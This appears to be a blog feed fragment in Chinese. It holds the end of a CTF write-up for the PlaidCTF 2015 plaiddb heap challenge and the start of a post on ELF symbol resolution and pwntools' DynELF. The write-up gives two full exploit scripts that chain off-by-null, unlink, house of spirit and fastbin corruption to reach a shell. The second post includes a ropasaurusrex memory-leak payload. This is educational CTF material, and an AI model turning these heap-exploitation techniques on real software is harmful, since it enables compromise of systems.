&#39;Q&#39;))DEL(&#39;P&#39;) # house of spiritDEL(&#39;KEY1&#39;)PUT(&#39;KEY1&#39;, (&#39;A&#39; * 0x108 +    p64(0x40) + p64(heap_base + 0x3e0) +    p64(0x64) + p64(0) + p64(0) + p64(0) + p64(0) +    p64(0x40) + p64(0x40) + p64(fake_chunk_addr) + &#39;A&#39; * 0x30 +    p64(0x40) + &#39;A&#39; * 0x78 + # 0x3d8    p64(0x40) + &#39;A&#39; * 0x40 + # 0x420    p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)).ljust(0x3e8, &#39;Q&#39;) # place gadgets) # fastbin corruption</code></pre><p>最后这里堆布局比较复杂，大概就是伪造一个 fastbin 然后再改它的指针，后面就能取到指针对应的 fake chunk：</p><pre><code> +------------+ 0x0f0 - 0x10 |    0x40    | node &#39;KEY1&#39; +------------+ 0x130 - 0x10 |    0x20    | &#39;&#39; +------------+ 0x150 - 0x10 |    0x20    | &#39;LEAKBUF&#39; +------------+ 0x170 - 0x10 |    0x40    | [freed] +------------+ 0x1b0 - 0x10 |    0x20    | [freed] +------------+ 0x1d0 - 0x10 |   0x3f0    | chunk +---- :: ----+ 0x260 - 0x10 |     ::     | [freed] +---- :: ----+ 0x2a0 - 0x10 |     ::     | [freed] +---- :: ----+ 0x2c0 - 0x10 |     ::     | [freed] +---- :: ----+ 0x2e0 - 0x10 |   [0x40]   | node &#39;LEAKBUF&#39; +---- :: ----+ 0x320 - 0x10 |   [0x20]   | [freed] +---- :: ----+ 0x340 - 0x10 |   [0x20]   | &#39;KEY1&#39; =&gt; fake_chunk_addr +---- :: ----+ 0x360 - 0x10 |     ::     | [freed] +---- :: ----+ 0x3a0 - 0x10 |     ::     | [freed] +---- :: ----+ 0x3c0 - 0x10 |   [0x40]   | &#39;X&#39; * 0xf8 =&gt; &#39;P\x00&#39; =&gt; &#39;A&#39; * 0x40 + gadgets +---- :: ----+ 0x4c0 - 0x10 |     ::     | [freed] +------------+ 0x5c0 - 0x10 |    0x20    | &#39;C&#39; * 0x18 +------------+</code></pre><p>最后用 PUT 里的任意大小 malloc 取一个大小为 56 的 chunk。前面构造的 fd 指针位置指向读进去的 data_size 存储的位置，因为程序用的是 strtoul，所以送出去的字符串都会被存在栈上，就能构造一个大小合适的 chunk。为了绕过对 main_arena 的检查，把 fake chunk 的 IS_MMAP 标志位开启：</p><pre><code class="python">cmd(&#39;PUT&#39;)p.recvuntil(&#39;Enter row key:&#39;)p.sendline(&#39;KEY1&#39;)p.recvuntil(&#39;Enter data size:&#39;)p.send(&#39;56&#39;.ljust(8, &#39; &#39;) + p64(0x42))p.recvuntil(&#39;PROMPT: Enter data:&#39;)p.send((&#39;A&#39; * 7 + p64(canary) + &#39;A&#39; * 0x10 + p64(fake_rbp) + p64(leave_ret)).ljust(55, &#39;A&#39;))</code></pre><p>最后送 data 的时候不是补成 55 是因为前面用 fgets 读 data_size 的时候最后面多补了个 <code>&quot;\x00&quot;</code>：</p><pre><code>0x7fff7e985540: 0x2020202020203635      0x00000000000000420x7fff7e985550: 0x4141414141414100      0xa5f15260d10909000x7fff7e985560: 0x4141414141414141      0x41414141414141410x7fff7e985570: 0x00005560f2703418      0x00007ff1b1cc9a9e0x7fff7e985580: 0x4141414141414141      0xa5f15260d1090900</code></pre><p>在 CTF-Wiki 上还有另外一种更简洁的做法，先造一堆 fastbin，接着构造 chunk。最后用 fastbin attack 改 malloc_hook：</p><pre><code>datastore-&gt;malloc(56)             = 0x55ac13f22010datastore-&gt;malloc(8)              = 0x55ac13f22050datastore-&gt;malloc(9)              = 0x55ac13f22070datastore-&gt;malloc(56)             = 0x55ac13f22090 =&gt; &#39;X&#39; * 0x200datastore-&gt;malloc(8)              = 0x55ac13f220d0datastore-&gt;malloc(56)             = 0x55ac13f220f0datastore-&gt;malloc(56)             = 0x55ac13f22130datastore-&gt;malloc(8)              = 0x55ac13f22170datastore-&gt;malloc(56)             = 0x55ac13f22190datastore-&gt;malloc(56)             = 0x55ac13f221d0datastore-&gt;malloc(8)              = 0x55ac13f22210datastore-&gt;malloc(56)             = 0x55ac13f22230datastore-&gt;malloc(56)             = 0x55ac13f22270datastore-&gt;malloc(8)              = 0x55ac13f222b0datastore-&gt;malloc(56)             = 0x55ac13f222d0datastore-&gt;malloc(56)             = 0x55ac13f22310datastore-&gt;malloc(8)              = 0x55ac13f22350datastore-&gt;malloc(56)             = 0x55ac13f22370datastore-&gt;malloc(56)             = 0x55ac13f223b0datastore-&gt;malloc(8)              = 0x55ac13f223f0 =&gt; &#39;6&#39;datastore-&gt;malloc(56)             = 0x55ac13f22410datastore-&gt;malloc(56)             = 0x55ac13f22450datastore-&gt;malloc(8)              = 0x55ac13f22490 =&gt; &#39;4&#39; =&gt; [freed] =&gt; &#39;fillup2&#39;datastore-&gt;malloc(56)             = 0x55ac13f224b0 =&gt; [freed] =&gt; node &#39;fillup2&#39;datastore-&gt;malloc(56)             = 0x55ac13f224f0 =&gt; node &#39;4&#39; =&gt; [freed] =&gt; node &#39;fillup1&#39;datastore-&gt;malloc(8)              = 0x55ac13f22530 =&gt; &#39;3&#39; =&gt; [freed]datastore-&gt;malloc(56)             = 0x55ac13f22550 =&gt; node &#39;6&#39;datastore-&gt;malloc(56)             = 0x55ac13f22590 =&gt; node &#39;5&#39; =&gt; [freed]datastore-&gt;malloc(8)              = 0x55ac13f225d0 =&gt; &#39;5&#39; =&gt; [freed]datastore-&gt;malloc(56)             = 0x55ac13f225f0 =&gt; node &#39;3&#39; =&gt; [freed]datastore-&gt;malloc(56)             = 0x55ac13f22630 =&gt; node &#39;1&#39; =&gt; [freed]datastore-&gt;malloc(8)              = 0x55ac13f22670 =&gt; &#39;2&#39;datastore-&gt;malloc(56)             = 0x55ac13f22690 =&gt; node &#39;2&#39;datastore-&gt;malloc(8)              = 0x55ac13f226d0 =&gt; &#39;1&#39; =&gt; [freed] =&gt; &#39;fillup1&#39;datastore-&gt;malloc(512)            = 0x55ac13f226f0 =&gt; &#39;1&#39; * 0x200 =&gt; [freed] &lt;= unlink pointer =&gt; &#39;X&#39; * 0x200datastore-&gt;malloc(80)             = 0x55ac13f22900 =&gt; &#39;2&#39; * 0x50datastore-&gt;malloc(104)            = 0x55ac13f22960 =&gt; &#39;5&#39; * 0x68 =&gt; [freed] &lt;= overlap fddatastore-&gt;malloc(504)            = 0x55ac13f229d0 =&gt; &#39;3&#39; * 0x1f8 =&gt; [freed] =&gt; &#39;A&#39; * 0x1f0 + p64(0xdb0 - 0x6f0)datastore-&gt;malloc(240)            = 0x55ac13f22bd0 =&gt; &#39;4&#39; * 0xf0 =&gt; [freed]datastore-&gt;malloc(1024)           = 0x55ac13f22cd0 =&gt; &#39;6&#39; * 0x400</code></pre><h1 id="Exploit-Script"><a href="#Exploit-Script" class="headerlink" title="Exploit Script"></a>Exploit Script</h1><p>第一种方法的 Exploit 主要是跟着 Winesap 做的：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *context.arch = &#39;amd64&#39;context.log_level = &#39;debug&#39;local = 0if local:    p = process(&#39;./datastore&#39;)    libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)else:    p = remote(&#39;127.0.0.1&#39;, 4000)    libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)def cmd(c):    p.recvuntil(&#39;Enter command:&#39;)    p.sendline(c)def PUT(key, data):    cmd(&#39;PUT&#39;)    p.recvuntil(&#39;Enter row key:&#39;)    p.sendline(key)    p.recvuntil(&#39;Enter data size:&#39;)    p.sendline(str(len(data)))    p.recvuntil(&#39;PROMPT: Enter data:&#39;)    p.send(data)def DEL(key):    cmd(&#39;DEL&#39;)    p.recvuntil(&#39;Enter row key:&#39;)    p.sendline(key)def GET(key):    cmd(&#39;GET&#39;)    p.recvuntil(&#39;Enter row key:&#39;)    p.sendline(key)    p.recvuntil(&#39; bytes]:\n&#39;)    return p.recvuntil(&#39;PROMPT: &#39;)[:-8]PUT(&#39;MMAP&#39;, &#39;Z&#39; * 0x21000)# Off by Null + UnlinkPUT(&#39;3&#39;, &#39;&#39;)PUT(&#39;0&#39;, &#39;C&#39; * 0x80) # smallbin for unlinkPUT(&#39;1&#39;, &#39;&#39;) # chunk for overflowPUT(&#39;2&#39;, &#39;&#39;)PUT(&#39;1&#39;, &#39;A&#39; * 0xf8)PUT(&#39;2&#39;, &#39;B&#39; * 0xf8 + p64(0x21) + &#39;C&#39; * 0x18) # chunk for off-by-null ; fake a fastbinDEL(&#39;1&#39;)DEL(&#39;X&#39; * 240 + p64(0x4c0 - 0x1d0)) # off-by-null(shrink) ; set prev_sizeDEL(&#39;0&#39;)DEL(&#39;2&#39;) # unlink#raw_input(&#39;@&#39;)# Leak Heap AddressDEL(&#39;3&#39;) # put a previous node chunk into fastbinPUT(&#39;KEY1&#39;, (&#39;A&#39; * 0x108 +    p64(0x40) + p64(0) + &#39;D&#39; * 0x30 +    p64(0x21) + p64(0) + &#39;C&#39; * 0x10 +    p64(0x21) + &#39;KEY1\x00&#39;).ljust(1000, &#39;Q&#39;))PUT(&#39;LEAKBUF&#39;, &#39;&#39;)data = GET(&#39;KEY1&#39;)heap_base = u64(data[0x110:0x118]) - 0x150info(&#39;heap_base = &#39; + hex(heap_base))#raw_input(&#39;@&#39;)# Function for Leaking Memorydef leak(addr, size):    PUT(&#39;KEY1&#39;, &#39;A&#39; * 0x3e8)    PUT(&#39;KEY1&#39;, data[:0x118] + p64(size) + p64(addr) + data[0x128:])    return GET(&#39;LEAKBUF&#39;)mmap_chunk = u64(leak(heap_base + 0xa0, 8)) - 0x10info(&#39;mmap_chunk = &#39; + hex(mmap_chunk))libc_base = u64(leak(mmap_chunk + 0x22000 + 0x750, 8)) - 0x5dc740info(&#39;libc_base = &#39; + hex(libc_base))canary = u64(leak(mmap_chunk + 0x22000 + 0x768, 8))info(&#39;canary = &#39; + hex(canary))stack_addr = u64(leak(mmap_chunk + 0x22000 + 0xa40, 8))info(&#39;stack_addr = &#39; + hex(stack_addr))#raw_input(&#39;@&#39;)# find Gadgets &amp; Bufferpop_rdi_ret = libc_base + libc.search(asm(&#39;pop rdi ; ret&#39;)).next()leave_ret = libc_base + libc.search(asm(&#39;leave ; ret&#39;)).next()system_addr = libc_base + libc.symbols[&#39;system&#39;]bin_sh_addr = libc_base + libc.search(&#39;/bin/sh&#39;).next()info(&#39;pop_rdi_ret = &#39; + hex(pop_rdi_ret))info(&#39;leave_ret = &#39; + hex(leave_ret))info(&#39;system_addr = &#39; + hex(system_addr))info(&#39;bin_sh_addr = &#39; + hex(bin_sh_addr))fake_chunk_addr = stack_addr - 0x90fake_rbp = heap_base + 0x420 - 8#raw_input(&#39;@&#39;)# House of Spirit + Fastbin Corruption + ROPPUT(&#39;KEY1&#39;, &#39;A&#39; * 0x3e8)PUT(&#39;KEY1&#39;, (&#39;A&#39; * 0x108 +    p64(0x40) + p64(heap_base + 0x3e0) + # point LEAKBUF&#39;s key to &#39;P\x00&#39;    p64(0x64) + p64(0) + p64(0) + p64(0) + p64(0) +    p64(0x40) + p64(0x40) + &#39;KEY1\x00&#39;.ljust(0x38, &#39;A&#39;) + # 0x358    p64(0x40) + &#39;A&#39; * 0x78 + # 0x3d8    p64(0x40) + &#39;P\x00&#39;.ljust(0x38, &#39;A&#39;) + p64(0x41)).ljust(0x3e8, &#39;Q&#39;))DEL(&#39;P&#39;) # house of spiritDEL(&#39;KEY1&#39;)#raw_input(&#39;@&#39;)PUT(&#39;KEY1&#39;, (&#39;A&#39; * 0x108 +    p64(0x40) + p64(heap_base + 0x3e0) +    p64(0x64) + p64(0) + p64(0) + p64(0) + p64(0) +    p64(0x40) + p64(0x40) + p64(fake_chunk_addr) + &#39;A&#39; * 0x30 +    p64(0x40) + &#39;A&#39; * 0x78 + # 0x3d8    p64(0x40) + &#39;A&#39; * 0x40 + # 0x420    p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)).ljust(0x3e8, &#39;Q&#39;) # place gadgets) # fastbin corruption#raw_input(&#39;@&#39;)cmd(&#39;PUT&#39;)p.recvuntil(&#39;Enter row key:&#39;)p.sendline(&#39;KEY1&#39;)p.recvuntil(&#39;Enter data size:&#39;)p.send(&#39;56&#39;.ljust(8, &#39; &#39;) + p64(0x42))p.recvuntil(&#39;PROMPT: Enter data:&#39;)#raw_input(&#39;@&#39;)p.send((&#39;A&#39; * 7 + p64(canary) + &#39;A&#39; * 0x10 + p64(fake_rbp) + p64(leave_ret)).ljust(55, &#39;A&#39;))p.recvuntil(&#39;INFO: Update successful.\n&#39;)p.interactive()</code></pre><p>另一种做法：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *context.arch = &#39;amd64&#39;context.log_level = &#39;debug&#39;local = 1if local:    p = process(&#39;./datastore&#39;)    libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)else:    p = remote(&#39;127.0.0.1&#39;, 4000)    libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)def cmd(c):    p.recvuntil(&#39;Enter command:&#39;)    p.sendline(c)def PUT(key, data):    cmd(&#39;PUT&#39;)    p.recvuntil(&#39;Enter row key:&#39;)    p.sendline(key)    p.recvuntil(&#39;Enter data size:&#39;)    p.sendline(str(len(data)))    p.recvuntil(&#39;PROMPT: Enter data:&#39;)    p.send(data)def DEL(key):    cmd(&#39;DEL&#39;)    p.recvuntil(&#39;Enter row key:&#39;)    p.sendline(key)def GET(key):    cmd(&#39;GET&#39;)    p.recvuntil(&#39;Enter row key:&#39;)    p.sendline(key)    p.recvuntil(&#39; bytes]:\n&#39;)    return p.recvuntil(&#39;PROMPT: &#39;)[:-8]for i in range(10):    PUT(str(i), str(i) * 0x38)for i in range(10):    DEL(str(i))PUT(&#39;1&#39;, &#39;1&#39; * 0x200)PUT(&#39;2&#39;, &#39;2&#39; * 0x50)PUT(&#39;5&#39;, &#39;5&#39; * 0x68)PUT(&#39;3&#39;, &#39;3&#39; * 0x1f8)PUT(&#39;4&#39;, &#39;4&#39; * 0xf0)PUT(&#39;6&#39;, &#39;6&#39; * 0x400)DEL(&#39;5&#39;)DEL(&#39;3&#39;)DEL(&#39;1&#39;)DEL(&#39;A&#39; * 0x1f0 + p64(0xbd0 - 0x6f0)) # off-by-null + shrinkDEL(&#39;4&#39;) # unlinkPUT(&#39;fillup1&#39;, &#39;X&#39; * 0x200)PUT(&#39;fillup2&#39;, &#39;X&#39; * 0x200)data = GET(&#39;2&#39;)libc_base = u64(data[:8]) - 0x3c27b8info(&#39;libc_base = &#39; + hex(libc_base))#raw_input(&#39;@&#39;)free_hook = libc_base + libc.symbols[&#39;__free_hook&#39;]malloc_hook = libc_base + libc.symbols[&#39;__malloc_hook&#39;]system = libc_base + libc.symbols[&#39;system&#39;]one_gadgets = [0x46428, 0x4647c, 0xe9415, 0xea36d]one_gadget = libc_base + one_gadgets[1]info(&#39;one_gadget = &#39; + hex(one_gadget))PUT(&#39;fastatk&#39;, (&#39;A&#39; * 0x58 + p64(0x71) + p64(malloc_hook - 0x23)).ljust(0x100, &#39;\x00&#39;))PUT(&#39;X&#39;, &#39;X&#39; * 0x68)#raw_input(&#39;@&#39;)PUT(&#39;atk&#39;, (&#39;A&#39; * 0x13 + p64(one_gadget)).ljust(0x68, &#39;\x00&#39;))DEL(&#39;2&#39;)p.interactive()</code></pre><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/off_by_one-zh/#2-plaidctf-2015-plaiddb" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/off_by_one-zh/#2-plaidctf-2015-plaiddb</a><br><a href="https://www.youtube.com/watch?v=jEHgm7S58N8" target="_blank" rel="noopener">https://www.youtube.com/watch?v=jEHgm7S58N8</a><br><a href="http://winesap.logdown.com/posts/261369-plaid-ctf-2015-plaiddb-writeup" target="_blank" rel="noopener">http://winesap.logdown.com/posts/261369-plaid-ctf-2015-plaiddb-writeup</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>wp</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>A Trip of Symbol Resolution</title>
    <link href="/2020/04/06/A-Trip-of-Symbol-Resolution/"/>
    <url>/2020/04/06/A-Trip-of-Symbol-Resolution/</url>
    
    <content type="html"><![CDATA[<p>重看 Winesap 的视频收获颇多，重新把 return-to-dl-resolve 整理了一下。</p><a id="more"></a><h1 id="Prepare"><a href="#Prepare" class="headerlink" title="Prepare"></a>Prepare</h1><p>需要编译一个带调试信息的 libc，之前的博客里记录过。要在 gdb 里跟进带调试信息 ld.so 的 Makefile 如下：</p><pre><code>all: aa: a.c        gcc a.c -o a -Wl,-dynamic-linker /path/to/install/lib/ld-2.23.so -g</code></pre><p>使用 apt 安装的 gdb 在 <code>_dl_fixup()</code> 中不能单步跟，会直接略过，通过修改源码添加一个环境变量来更改 gdb 的跟进。这里以 gdb-7.11.1 为例：</p><pre><code class="cpp">...6501   /* If we are stepping at the source level and entered the runtime6502      loader dynamic symbol resolution code...65036504      EXEC_FORWARD: we keep on single stepping until we exit the run6505      time loader code and reach the callee&#39;s address.65066507      EXEC_REVERSE: we&#39;ve already executed the callee (backward), and6508      the runtime loader code is handled just like any other6509      undebuggable function call.  Now we need only keep stepping6510      backward through the trampoline code, and that&#39;s handled further6511      down, so there is nothing for us to do here.  */65126513   static int env_debug_resolver = -1;6514   if (env_debug_resolver == -1) {6515     char *env_debug_resolver_str = getenv(&quot;DEBUG_RESOLVER&quot;);6516     if (env_debug_resolver_str &amp;&amp; !strcmp(env_debug_resolver_str, &quot;1&quot;)) {6517       env_debug_resolver = 1;6518     } else {6519       env_debug_resolver = 0;6520     }6521   }6522   if (execution_direction != EXEC_REVERSE6523       &amp;&amp; ecs-&gt;event_thread-&gt;control.step_over_calls == STEP_OVER_UNDEBUGGABLE6524       &amp;&amp; env_debug_resolver == 06525       &amp;&amp; in_solib_dynsym_resolve_code (stop_pc))6526     {6527       CORE_ADDR pc_after_resolver =6528         gdbarch_skip_solib_resolver (gdbarch, stop_pc);...</code></pre><p>生成 Makefile 时必须添加 <code>--enable-tui</code> 才会有 layout 的界面（编译的时候使用系统默认 python 版本，如果需要 pwndbg、gef 之类的插件就必须用 python3）：</p><pre><code class="bash">../configure --enable-tui --with-python=/usr/bin/python2.7</code></pre><p>如果在最后安装 gdb 的时候出现 <code>makeinfo: not found</code>，只需要装个 <code>texinfo</code> 即可：</p><pre><code class="bash">/home/b3ale/gdb-7.11.1/missing: 81: /home/b3ale/gdb-7.11.1/missing: makeinfo: not foundWARNING: &#39;makeinfo&#39; is missing on your system.         You should only need it if you modified a &#39;.texi&#39; file, or         any other file indirectly affecting the aspect of the manual.         You might want to install the Texinfo package:         &lt;http://www.gnu.org/software/texinfo/&gt;         The spurious makeinfo call might also be the consequence of         using a buggy &#39;make&#39; (AIX, DU, IRIX), in which case you might         want to install GNU make:         &lt;http://www.gnu.org/software/make/&gt;Makefile:503: recipe for target &#39;gdb.info&#39; failedmake[5]: *** [gdb.info] Error 127make[5]: Leaving directory &#39;/home/b3ale/gdb-7.11.1/build/gdb/doc&#39;Makefile:1505: recipe for target &#39;subdir_do&#39; failedmake[4]: *** [subdir_do] Error 1make[4]: Leaving directory &#39;/home/b3ale/gdb-7.11.1/build/gdb&#39;Makefile:1240: recipe for target &#39;install-only&#39; failedmake[3]: *** [install-only] Error 2make[3]: Leaving directory &#39;/home/b3ale/gdb-7.11.1/build/gdb&#39;Makefile:1237: recipe for target &#39;install&#39; failedmake[2]: *** [install] Error 2make[2]: Leaving directory &#39;/home/b3ale/gdb-7.11.1/build/gdb&#39;Makefile:9185: recipe for target &#39;install-gdb&#39; failedmake[1]: *** [install-gdb] Error 2make[1]: Leaving directory &#39;/home/b3ale/gdb-7.11.1/build&#39;Makefile:2248: recipe for target &#39;install&#39; failedmake: *** [install] Error 2</code></pre><p>在需要调试 <code>_dl_fixup()</code> 时只需要 export 一个环境变量即可：</p><pre><code class="bash">export DEBUG_RESOLVER=1</code></pre><p>对于没有链接带符号 ld 的程序，可以在本地做一个软链接，然后把程序中 ld 对应的字符串替换掉（以 32 位为例）：</p><pre><code class="bash">sed -i s/ld-linux.so.2/LD-linux.so.2/g ./binary</code></pre><h1 id="How-DynELF-Works"><a href="#How-DynELF-Works" class="headerlink" title="How DynELF Works?"></a>How DynELF Works?</h1><p>在 pwntools 中有一个工具叫 DynELF，可以通过一个任意内存读的漏洞来对获取 libc 以及解析出 libc 中任何函数的地址。它的原理跟 ELF 的相关结构有关，下面先来看看怎么使用 DynELF。</p><h2 id="PlaidCTF-2013-ropasaurusrex"><a href="#PlaidCTF-2013-ropasaurusrex" class="headerlink" title="PlaidCTF-2013-ropasaurusrex"></a>PlaidCTF-2013-ropasaurusrex</h2><p>以 PlaidCTF 2013 中的 ropasaurusrex 为例。程序很简单，明显有溢出：</p><pre><code class="cpp">ssize_t __cdecl main(){  vul();  return write(1, &quot;WIN\n&quot;, 4u);}ssize_t vul(){  char buf; // [esp+10h] [ebp-88h]  return read(0, &amp;buf, 0x100u);}</code></pre><p>通过溢出可以修改返回地址为 <code>start</code>，来构造无限次输入；同时可以跳 <code>write</code> 来泄漏信息。能构造出如下的 leak 函数，每次可以泄漏指定地址上的 4 个字节的数据：</p><pre><code class="python">elf = ELF(&#39;./ropasaurusrex&#39;)write_plt = elf.plt[&#39;write&#39;]start_addr = 0x8048340def leak(addr):    payload = flat(        &#39;A&#39; * 140,        write_plt,        start_addr,        1,        addr,        4    )    p.sendline(payload)    data = p.recv(4)    info(hex(addr) + &#39; ==&gt; &#39; + data)    return data</code></pre><p>使用 DynELF 指定开始泄漏的地址，可以把 libc 的基址泄漏出来：</p><pre><code class="python">#  0x8048000  0x8049000 r-xp     1000 0      /root/tmp/ropasaurusrexprog = DynELF(leak, 0x8048000)bases = prog.bases()info(bases)for l in bases:    if &#39;libc.so.6&#39; in l:        ptr = bases[l]info(&#39;ptr =&gt; &#39; + hex(ptr))</code></pre><p>然后从 libc 基址开始使用 DynELF 找到 <code>system</code> 和 <code>read</code> 的地址：</p><pre><code class="python">libc = DynELF(leak, ptr)system_addr = libc.lookup(&#39;system&#39;)read_addr = libc.lookup(&#39;read&#39;)</code></pre><h2 id="Lazy-Symbol-Binding"><a href="#Lazy-Symbol-Binding" class="headerlink" title="Lazy Symbol Binding"></a>Lazy Symbol Binding</h2><p>接下来慢慢解释 DynELF 是怎么实现的。先要了解延迟绑定这一概念。在程序执行的过程中，可能有些引入的 C 库函数到结束时都不会执行。所以 ELF 采用延迟绑定的技术，在第一次调用 C 库函数时才会去寻找真正的位置进行绑定：</p><ul><li>程序启动时，外部函数的地址未知（比如说在 libc 中的函数）</li><li>只有动态链接的程序需要解析函数地址，静态链接的程序不需要</li><li>函数第一次被调用时，通过 Dynamic Resolver 来计算函数的地址，并在 GOT 上做好重定位</li></ul><h2 id="ELF-Structure"><a href="#ELF-Structure" class="headerlink" title="ELF Structure"></a>ELF Structure</h2><p>接下来了解一下 ELF 文件的结构。结构体在 <a href="https://code.woboq.org/userspace/glibc/elf/elf.h.html" target="_blank" rel="noopener"><code>glibc/elf/elf.h</code></a> 中。</p><p>笼统地来说，ELF 包括 ELF Header、Program Header Table、Section（Segment）、Section Header Table 几个部分。在程序执行前和执行时，ELF 的结构是不同的。在程序执行前，ELF Header 中存储了 Section Header Table 的位置，而 Section Header Table 中又存储了每个 Section 的位置；在程序执行时，一个或多个 Section 会被映射到一个 Segment 中，ELF Header 中存储了 Program Header Table 的位置，而 Program Header Table 中存储了各个 Segment 的地址：</p><pre><code>             Linking View                        Execution View       +----------------------+             +----------------------+       |      ELF Header      |  ---+ +---  |      ELF Header      |       |----------------------|     | |     |----------------------|       | Program Header Table |     | +---&gt; | Program Header Table |  ---+       |      (optional)      |     |       |----------------------|     |       |----------------------|     |       |                      |     | +---&gt; |      Section 1       | ----|-----&gt; |      Segment 1       | &lt;---| |     |----------------------|     | |     |                      |     | |     |         ...          | ----|-+     |----------------------|     | |     |----------------------|     |       |                      |     | |---&gt; |      Section n       | ----|-----&gt; |      Segment 2       | &lt;---+ |     |----------------------|     | |     |                      | |     |         ...          | ----|-+     |----------------------| |     |----------------------|     |       | Section Header Table | +---  | Section Header Table | &lt;---+       |      (optional)      |       +----------------------+             +----------------------+</code></pre><p>几个部分大概的描述如下：</p><ul><li>Section（节区）：存放代码和数据的一块连续内存（例：.text、.data、.bss、.got）<ul><li><code>objdump -j .got.plt -s ./</code></li></ul></li><li>Segment（段）：包含多个 Section 的连续内存</li><li>Program Header Table 描述 Section 和 Segment 的对应关系，不一定所有的 Section 都会有映射，所以 Section 中的数据不一定全部出现在内存中</li></ul><p>ELF Header 中，<code>e_ident</code> 存储了 Magic Number 即 <code>&quot;\x7fELF&quot;</code>，<code>e_machine</code> 即程序对应的架构，<code>e_entry</code> 存储了程序的入口点，<code>e_phoff</code> 和 <code>e_shoff</code> 分别存储了 Program Header Table 和 Section Header Table 的偏移，<code>e_phentsize</code> 和 <code>e_shentsize</code> 分别存储了 Program Header Table 和 Section Header Table 的结构体大小，<code>e_phnum</code> 和 <code>e_shnum</code> 分别存储了 Program Header Table 和 Section Header Table 中 Header 的数量：</p><pre><code class="cpp">typedef struct{  unsigned char        e_ident[EI_NIDENT];        /* Magic number and other info */  Elf32_Half        e_type;                        /* Object file type */  Elf32_Half        e_machine;                /* Architecture */  Elf32_Word        e_version;                /* Object file version */  Elf32_Addr        e_entry;                /* Entry point virtual address */  Elf32_Off        e_phoff;                /* Program header table file offset */  Elf32_Off        e_shoff;                /* Section header table file offset */  Elf32_Word        e_flags;                /* Processor-specific flags */  Elf32_Half        e_ehsize;                /* ELF header size in bytes */  Elf32_Half        e_phentsize;                /* Program header table entry size */  Elf32_Half        e_phnum;                /* Program header table entry count */  Elf32_Half        e_shentsize;                /* Section header table entry size */  Elf32_Half        e_shnum;                /* Section header table entry count */  Elf32_Half        e_shstrndx;                /* Section header string table index */} Elf32_Ehdr;typedef struct{  unsigned char        e_ident[EI_NIDENT];        /* Magic number and other info */  Elf64_Half        e_type;                        /* Object file type */  Elf64_Half        e_machine;                /* Architecture */  Elf64_Word        e_version;                /* Object file version */  Elf64_Addr        e_entry;                /* Entry point virtual address */  Elf64_Off        e_phoff;                /* Program header table file offset */  Elf64_Off        e_shoff;                /* Section header table file offset */  Elf64_Word        e_flags;                /* Processor-specific flags */  Elf64_Half        e_ehsize;                /* ELF header size in bytes */  Elf64_Half        e_phentsize;                /* Program header table entry size */  Elf64_Half        e_phnum;                /* Program header table entry count */  Elf64_Half        e_shentsize;                /* Section header table entry size */  Elf64_Half        e_shnum;                /* Section header table entry count */  Elf64_Half        e_shstrndx;                /* Section header string table index */} Elf64_Ehdr;</code></pre><p>Section Header Table 是一个 <code>Elf64_Shdr</code>（<code>Elf32_Shdr</code>）的数组（程序执行时一般没有 Section Header Table），指出每个 Section 的地址：</p><pre><code class="cpp">/* Section header.  */typedef struct{  Elf32_Word        sh_name;                /* Section name (string tbl index) */  Elf32_Word        sh_type;                /* Section type */  Elf32_Word        sh_flags;                /* Section flags */  Elf32_Addr        sh_addr;                /* Section virtual addr at execution */  Elf32_Off        sh_offset;                /* Section file offset */  Elf32_Word        sh_size;                /* Section size in bytes */  Elf32_Word        sh_link;                /* Link to another section */  Elf32_Word        sh_info;                /* Additional section information */  Elf32_Word        sh_addralign;                /* Section alignment */  Elf32_Word        sh_entsize;                /* Entry size if section holds table */} Elf32_Shdr;typedef struct{  Elf64_Word        sh_name;                /* Section name (string tbl index) */  Elf64_Word        sh_type;                /* Section type */  Elf64_Xword        sh_flags;                /* Section flags */  Elf64_Addr        sh_addr;                /* Section virtual addr at execution */  Elf64_Off        sh_offset;                /* Section file offset */  Elf64_Xword        sh_size;                /* Section size in bytes */  Elf64_Word        sh_link;                /* Link to another section */  Elf64_Word        sh_info;                /* Additional section information */  Elf64_Xword        sh_addralign;                /* Section alignment */  Elf64_Xword        sh_entsize;                /* Entry size if section holds table */} Elf64_Shdr;</code></pre><p>Program Header Table 是一个 <code>Elf64_Phdr</code>（<code>Elf32_Phdr</code>）的数组，指定数据以及其在内存中的位置，即某个范围会被加载到哪个地址（Segment 包含多个 Section）：</p><pre><code class="cpp">/* Program segment header.  */typedef struct{  Elf32_Word        p_type;                        /* Segment type */  Elf32_Off        p_offset;                /* Segment file offset */  Elf32_Addr        p_vaddr;                /* Segment virtual address */  Elf32_Addr        p_paddr;                /* Segment physical address */  Elf32_Word        p_filesz;                /* Segment size in file */  Elf32_Word        p_memsz;                /* Segment size in memory */  Elf32_Word        p_flags;                /* Segment flags */  Elf32_Word        p_align;                /* Segment alignment */} Elf32_Phdr;typedef struct{  Elf64_Word        p_type;                        /* Segment type */  Elf64_Word        p_flags;                /* Segment flags */  Elf64_Off        p_offset;                /* Segment file offset */  Elf64_Addr        p_vaddr;                /* Segment virtual address */  Elf64_Addr        p_paddr;                /* Segment physical address */  Elf64_Xword        p_filesz;                /* Segment size in file */  Elf64_Xword        p_memsz;                /* Segment size in memory */  Elf64_Xword        p_align;                /* Segment alignment */} Elf64_Phdr;</code></pre><h3 id="Dynamic-Section"><a href="#Dynamic-Section" class="headerlink" title="Dynamic Section"></a>Dynamic Section</h3><p><code>.dynamic</code> 是一个 <code>Elf64_Dyn</code>（<code>Elf32_Dyn</code>）数组，是解析 Symbol 时最重要的一个 Section。执行时可以根据 Program Header Table，找出 <code>p_type</code> 值为 <code>PT_DYNAMIC</code> 的 Program Header。Program Header Table 的基址加上 